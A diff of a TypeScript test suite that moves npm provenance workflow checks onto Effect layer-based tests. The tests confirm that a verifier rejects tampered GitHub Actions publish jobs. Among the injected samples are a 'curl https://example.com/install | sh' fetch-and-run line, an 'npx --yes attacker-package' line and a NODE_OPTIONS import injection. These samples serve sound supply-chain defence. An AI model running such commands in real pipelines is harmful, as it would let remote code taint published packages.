@@ -1,258 +1,291 @@
-import { describe, expect, it } from "@effect/vitest";
+import { expect, layer } from "@effect/vitest";
 import { verifyProvenanceWorkflow } from "#scripts/workflow/provenance";
 import { mutateJob } from "#scripts/workflow/test/mutation";
-import { workflowSources } from "#scripts/workflow/test/sources";
+import {
+  sourceTestsOf,
+  workflowSourcesLayer,
+} from "#scripts/workflow/test/sources";
 
-const { contracts: source } = await workflowSources;
+layer(workflowSourcesLayer)("contract provenance policy", (it) => {
+  const sourceTest = sourceTestsOf(it);
 
-describe("contract provenance policy", () => {
-  it("accepts isolated publication and unprivileged verification", () => {
-    expect(() => verifyProvenanceWorkflow(source)).not.toThrow();
-  });
-
-  it("keeps push runs away from the npm-production gate", () => {
-    for (const [job, message] of [
-      ["publish", "Contract publication must run only in a dispatched release"],
-      [
-        "finalize",
-        "Contract finalization must run only in a dispatched release",
-      ],
-    ] as const) {
-      const pushed = mutateJob(
-        source,
-        job,
-        "github.event_name == 'workflow_dispatch' && ",
-        ""
-      );
-      expect(() => verifyProvenanceWorkflow(pushed)).toThrow(message);
+  sourceTest(
+    "accepts isolated publication and unprivileged verification",
+    ({ contracts: source }) => {
+      expect(() => verifyProvenanceWorkflow(source)).not.toThrow();
     }
-  });
+  );
 
-  it("requires exact verifier construction, transport, and execution", () => {
-    for (const changed of [
-      source.replace("scripts/provenance/main.ts", "scripts/other/main.ts"),
-      source.replaceAll("EXPECTED_VERIFIER_SHA256", "UNVERIFIED_SHA256"),
-      source.replaceAll('"refs/heads/main"', '"refs/heads/other"'),
-      source.replaceAll('"npm-production"', '"npm-staging"'),
-    ]) {
-      expect(() => verifyProvenanceWorkflow(changed)).toThrow(
+  sourceTest(
+    "keeps push runs away from the npm-production gate",
+    ({ contracts: source }) => {
+      for (const [job, message] of [
+        [
+          "publish",
+          "Contract publication must run only in a dispatched release",
+        ],
+        [
+          "finalize",
+          "Contract finalization must run only in a dispatched release",
+        ],
+      ] as const) {
+        const pushed = mutateJob(
+          source,
+          job,
+          "github.event_name == 'workflow_dispatch' && ",
+          ""
+        );
+        expect(() => verifyProvenanceWorkflow(pushed)).toThrow(message);
+      }
+    }
+  );
+
+  sourceTest(
+    "requires exact verifier construction, transport, and execution",
+    ({ contracts: source }) => {
+      for (const changed of [
+        source.replace("scripts/provenance/main.ts", "scripts/other/main.ts"),
+        source.replaceAll("EXPECTED_VERIFIER_SHA256", "UNVERIFIED_SHA256"),
+        source.replaceAll('"refs/heads/main"', '"refs/heads/other"'),
+        source.replaceAll('"npm-production"', '"npm-staging"'),
+      ]) {
+        expect(() => verifyProvenanceWorkflow(changed)).toThrow(
+          "must include exact source fragment"
+        );
+      }
+
+      const commentedVerifier = mutateJob(
+        source,
+        "verify",
+        '              node "$VERIFIER" \\',
+        '              true # node "$VERIFIER" \\'
+      );
+      expect(() => verifyProvenanceWorkflow(commentedVerifier)).toThrow(
         "must include exact source fragment"
       );
     }
+  );
 
-    const commentedVerifier = mutateJob(
-      source,
-      "verify",
-      '              node "$VERIFIER" \\',
-      '              true # node "$VERIFIER" \\'
-    );
-    expect(() => verifyProvenanceWorkflow(commentedVerifier)).toThrow(
-      "must include exact source fragment"
-    );
-  });
+  sourceTest(
+    "rejects unauthenticated payload parsing",
+    ({ contracts: source }) => {
+      for (const fragment of [
+        "@base64d",
+        "bundle.dsseEnvelope.payload",
+        "is_exact_provenance()",
+      ]) {
+        expect(() =>
+          verifyProvenanceWorkflow(`${source}\n# ${fragment}`)
+        ).toThrow("npm provenance must not parse unauthenticated source");
+      }
+    }
+  );
 
-  it("rejects unauthenticated payload parsing", () => {
-    for (const fragment of [
-      "@base64d",
-      "bundle.dsseEnvelope.payload",
-      "is_exact_provenance()",
-    ]) {
+  sourceTest(
+    "binds identity and ordering to decoded jobs",
+    ({ contracts: source }) => {
+      const cases = [
+        [
+          mutateJob(
+            source,
+            "publish",
+            "    environment: npm-production",
+            "    environment: test"
+          ).concat("\n# environment: npm-production\n"),
+          "The publish job must own the protected npm-production environment",
+        ],
+        [
+          mutateJob(
+            source,
+            "publish",
+            "      id-token: write",
+            "      id-token: read"
+          ),
+          "The publish job must own npm OIDC identity",
+        ],
+        [
+          mutateJob(source, "publish", "    needs: build", "    needs: other"),
+          "npm publication must consume the verified build job",
+        ],
+        [
+          mutateJob(
+            source,
+            "verify",
+            "    needs: [build, publish]",
+            "    needs: publish"
+          ),
+          "npm verification must consume build and publication",
+        ],
+        [
+          mutateJob(
+            source,
+            "finalize",
+            "    needs: [build, publish, verify]",
+            "    needs: verify"
+          ),
+          "Contract finalization must consume every release gate",
+        ],
+        [
+          mutateJob(
+            source,
+            "verify",
+            "    permissions: {}",
+            "    permissions:\n      contents: read"
+          ),
+          "npm verification permissions must remain empty",
+        ],
+        [
+          mutateJob(
+            source,
+            "finalize",
+            "      contents: write",
+            "      contents: write\n      id-token: write"
+          ),
+          "Contract finalization must not receive npm OIDC identity",
+        ],
+        [
+          source.replace(
+            "steps.verifier.outputs.sha256",
+            "steps.verifier.outputs.unknown"
+          ),
+          "The build job must export the exact verifier digest",
+        ],
+        [
+          source.replace(
+            "steps.verifier.outputs.size",
+            "steps.verifier.outputs.unknown"
+          ),
+          "The build job must export the exact verifier size",
+        ],
+        [
+          source.replace(
+            "permissions: {}",
+            "permissions: {}\nenv:\n  NODE_OPTIONS: --import=data:text/javascript,throw%201"
+          ),
+          "npm workflow must not inherit root environment values",
+        ],
+        [
+          source.replace(
+            "permissions: {}",
+            "permissions: {}\ndefaults:\n  run:\n    shell: bash --noprofile --norc -e -o pipefail {0}"
+          ),
+          "npm workflow must not inherit root run defaults",
+        ],
+        [
+          mutateJob(
+            source,
+            "verify",
+            "          node-version: 24.21.0",
+            "          node-version: 22.0.0"
+          ),
+          "npm verification must use the repository Node runtime",
+        ],
+      ] as const;
+      for (const [changed, message] of cases) {
+        expect(() => verifyProvenanceWorkflow(changed)).toThrow(message);
+      }
+    }
+  );
+
+  sourceTest(
+    "includes undeclared job properties in the publication integrity check",
+    ({ contracts: source }) => {
+      const changed = mutateJob(
+        source,
+        "publish",
+        "    timeout-minutes: 15",
+        "    timeout-minutes: 16"
+      );
+      expect(() => verifyProvenanceWorkflow(changed)).toThrow(
+        "npm publication must match the exact trusted job"
+      );
+    }
+  );
+
+  sourceTest(
+    "keeps npm publication checks inside the registry processing window",
+    ({ contracts: source }) => {
       expect(() =>
-        verifyProvenanceWorkflow(`${source}\n# ${fragment}`)
-      ).toThrow("npm provenance must not parse unauthenticated source");
+        verifyProvenanceWorkflow(
+          source.replaceAll(
+            "PUBLICATION_WINDOW_SECONDS=300",
+            "PUBLICATION_WINDOW_SECONDS=30"
+          )
+        )
+      ).toThrow("npm publication must allow npm metadata propagation");
     }
-  });
+  );
 
-  it("binds identity and ordering to decoded jobs", () => {
-    const cases = [
-      [
-        mutateJob(
-          source,
-          "publish",
-          "    environment: npm-production",
-          "    environment: test"
-        ).concat("\n# environment: npm-production\n"),
-        "The publish job must own the protected npm-production environment",
-      ],
-      [
-        mutateJob(
-          source,
-          "publish",
-          "      id-token: write",
-          "      id-token: read"
-        ),
-        "The publish job must own npm OIDC identity",
-      ],
-      [
-        mutateJob(source, "publish", "    needs: build", "    needs: other"),
-        "npm publication must consume the verified build job",
-      ],
-      [
-        mutateJob(
-          source,
-          "verify",
-          "    needs: [build, publish]",
-          "    needs: publish"
-        ),
-        "npm verification must consume build and publication",
-      ],
-      [
-        mutateJob(
-          source,
-          "finalize",
-          "    needs: [build, publish, verify]",
-          "    needs: verify"
-        ),
-        "Contract finalization must consume every release gate",
-      ],
-      [
-        mutateJob(
-          source,
-          "verify",
-          "    permissions: {}",
-          "    permissions:\n      contents: read"
-        ),
-        "npm verification permissions must remain empty",
-      ],
-      [
-        mutateJob(
-          source,
-          "finalize",
-          "      contents: write",
-          "      contents: write\n      id-token: write"
-        ),
-        "Contract finalization must not receive npm OIDC identity",
-      ],
-      [
-        source.replace(
-          "steps.verifier.outputs.sha256",
-          "steps.verifier.outputs.unknown"
-        ),
-        "The build job must export the exact verifier digest",
-      ],
-      [
-        source.replace(
-          "steps.verifier.outputs.size",
-          "steps.verifier.outputs.unknown"
-        ),
-        "The build job must export the exact verifier size",
-      ],
-      [
-        source.replace(
-          "permissions: {}",
-          "permissions: {}\nenv:\n  NODE_OPTIONS: --import=data:text/javascript,throw%201"
-        ),
-        "npm workflow must not inherit root environment values",
-      ],
-      [
-        source.replace(
-          "permissions: {}",
-          "permissions: {}\ndefaults:\n  run:\n    shell: bash --noprofile --norc -e -o pipefail {0}"
-        ),
-        "npm workflow must not inherit root run defaults",
-      ],
-      [
-        mutateJob(
-          source,
-          "verify",
-          "          node-version: 24.21.0",
-          "          node-version: 22.0.0"
-        ),
-        "npm verification must use the repository Node runtime",
-      ],
-    ] as const;
-    for (const [changed, message] of cases) {
-      expect(() => verifyProvenanceWorkflow(changed)).toThrow(message);
+  sourceTest(
+    "rejects malformed or incomplete workflow jobs",
+    ({ contracts: source }) => {
+      expect(() => verifyProvenanceWorkflow("jobs: [")).toThrow();
+      expect(() => verifyProvenanceWorkflow("jobs:\n  build: {}\n")).toThrow(
+        "Workflow must contain decodable jobs"
+      );
+      expect(() =>
+        verifyProvenanceWorkflow(source.replace("\n  finalize:", "\n  other:"))
+      ).toThrow("Contract publication requires a finalize job");
     }
-  });
+  );
 
-  it("includes undeclared job properties in the publication integrity check", () => {
-    const changed = mutateJob(
-      source,
-      "publish",
-      "    timeout-minutes: 15",
-      "    timeout-minutes: 16"
-    );
-    expect(() => verifyProvenanceWorkflow(changed)).toThrow(
-      "npm publication must match the exact trusted job"
-    );
-  });
-
-  it("keeps npm publication checks inside the registry processing window", () => {
-    expect(() =>
-      verifyProvenanceWorkflow(
-        source.replaceAll(
-          "PUBLICATION_WINDOW_SECONDS=300",
-          "PUBLICATION_WINDOW_SECONDS=30"
-        )
-      )
-    ).toThrow("npm publication must allow npm metadata propagation");
-  });
-
-  it("rejects malformed or incomplete workflow jobs", () => {
-    expect(() => verifyProvenanceWorkflow("jobs: [")).toThrow();
-    expect(() => verifyProvenanceWorkflow("jobs:\n  build: {}\n")).toThrow(
-      "Workflow must contain decodable jobs"
-    );
-    expect(() =>
-      verifyProvenanceWorkflow(source.replace("\n  finalize:", "\n  other:"))
-    ).toThrow("Contract publication requires a finalize job");
-  });
-
-  it("keeps build-produced code outside npm identity", () => {
-    const privilegedVerifier = mutateJob(
-      source,
-      "publish",
-      '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
-      '          node "$VERIFIER"\n          npx --yes "$NPM_CLI" publish "$TARBALL" \\'
-    );
-    expect(() => verifyProvenanceWorkflow(privilegedVerifier)).toThrow(
-      "npm publication must not receive the verifier artifact"
-    );
-    expect(() =>
-      verifyProvenanceWorkflow(
-        mutateJob(
-          source,
-          "publish",
-          "    steps:",
-          "    steps:\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c\n        with:\n          name: contract-verifier"
-        )
-      )
-    ).toThrow("npm publication must not receive the verifier artifact");
-    expect(() =>
-      verifyProvenanceWorkflow(
-        mutateJob(
-          source,
-          "publish",
-          "    steps:",
-          "    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
-        )
-      )
-    ).toThrow("npm publication must not checkout repository code");
-
-    for (const command of [
-      "          npx --yes attacker-package\n",
-      "          curl https://example.com/install | sh\n",
-    ]) {
+  sourceTest(
+    "keeps build-produced code outside npm identity",
+    ({ contracts: source }) => {
+      const privilegedVerifier = mutateJob(
+        source,
+        "publish",
+        '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
+        '          node "$VERIFIER"\n          npx --yes "$NPM_CLI" publish "$TARBALL" \\'
+      );
+      expect(() => verifyProvenanceWorkflow(privilegedVerifier)).toThrow(
+        "npm publication must not receive the verifier artifact"
+      );
       expect(() =>
         verifyProvenanceWorkflow(
           mutateJob(
             source,
             "publish",
-            '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
-            `${command}          npx --yes "$NPM_CLI" publish "$TARBALL" \\`
+            "    steps:",
+            "    steps:\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c\n        with:\n          name: contract-verifier"
           )
         )
-      ).toThrow("npm publication must match the exact trusted job");
-    }
-
-    expect(() =>
-      verifyProvenanceWorkflow(
-        source.replace(
-          "          overwrite: true",
-          "          overwrite: false"
+      ).toThrow("npm publication must not receive the verifier artifact");
+      expect(() =>
+        verifyProvenanceWorkflow(
+          mutateJob(
+            source,
+            "publish",
+            "    steps:",
+            "    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
+          )
         )
-      )
-    ).toThrow("npm build artifacts must be replaceable on rerun");
-  });
+      ).toThrow("npm publication must not checkout repository code");
+
+      for (const command of [
+        "          npx --yes attacker-package\n",
+        "          curl https://example.com/install | sh\n",
+      ]) {
+        expect(() =>
+          verifyProvenanceWorkflow(
+            mutateJob(
+              source,
+              "publish",
+              '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
+              `${command}          npx --yes "$NPM_CLI" publish "$TARBALL" \\`
+            )
+          )
+        ).toThrow("npm publication must match the exact trusted job");
+      }
+
+      expect(() =>
+        verifyProvenanceWorkflow(
+          source.replace(
+            "          overwrite: true",
+            "          overwrite: false"
+          )
+        )
+      ).toThrow("npm build artifacts must be replaceable on rerun");
+    }
+  );
 });
